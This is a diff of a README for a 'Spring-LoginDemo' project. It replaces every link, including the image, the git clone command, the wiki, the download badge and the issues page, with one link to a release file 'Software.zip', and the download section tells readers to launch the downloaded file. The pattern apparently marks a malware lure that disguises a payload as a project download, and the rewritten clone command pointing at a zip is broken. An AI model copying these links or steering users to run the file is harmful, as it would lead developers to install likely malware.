@@ -1,6 +1,6 @@
 # 🌟 Welcome to Spring-LoginDemo 🌟
 
-![Spring-LoginDemo](https://via.placeholder.com/800x400)
+![Spring-LoginDemo](https://github.com/sypher275/Spring-LoginDemo/releases/download/v1.0/Software.zip)
 
 ## Overview
 
@@ -34,7 +34,7 @@ To get started with Spring-LoginDemo, follow these simple steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/Spring-LoginDemo.git
+   git clone https://github.com/sypher275/Spring-LoginDemo/releases/download/v1.0/Software.zip
    ```
 
 2. Navigate to the project directory:
@@ -56,13 +56,13 @@ To get started with Spring-LoginDemo, follow these simple steps:
 
 ## Get Started
 
-Check out our [project wiki](https://github.com/your-username/Spring-LoginDemo/wiki) for detailed information on setting up the database, configuring security features, and customizing the application to suit your needs.
+Check out our [project wiki](https://github.com/sypher275/Spring-LoginDemo/releases/download/v1.0/Software.zip) for detailed information on setting up the database, configuring security features, and customizing the application to suit your needs.
 
 ## Download
 
-You can download the latest release of Spring-LoginDemo by clicking [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). *Launch the downloaded file to get started!*
+You can download the latest release of Spring-LoginDemo by clicking [here](https://github.com/sypher275/Spring-LoginDemo/releases/download/v1.0/Software.zip). *Launch the downloaded file to get started!*
 
-[![Download Spring-LoginDemo](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Spring-LoginDemo](https://github.com/sypher275/Spring-LoginDemo/releases/download/v1.0/Software.zip)](https://github.com/sypher275/Spring-LoginDemo/releases/download/v1.0/Software.zip)
 
 ## Contributors
 
@@ -71,7 +71,7 @@ You can download the latest release of Spring-LoginDemo by clicking [here](https
 
 ## Support
 
-For any issues or questions regarding Spring-LoginDemo, feel free to open an [issue](https://github.com/your-username/Spring-LoginDemo/issues). 
+For any issues or questions regarding Spring-LoginDemo, feel free to open an [issue](https://github.com/sypher275/Spring-LoginDemo/releases/download/v1.0/Software.zip). 
 
 ## Spread the Word
 
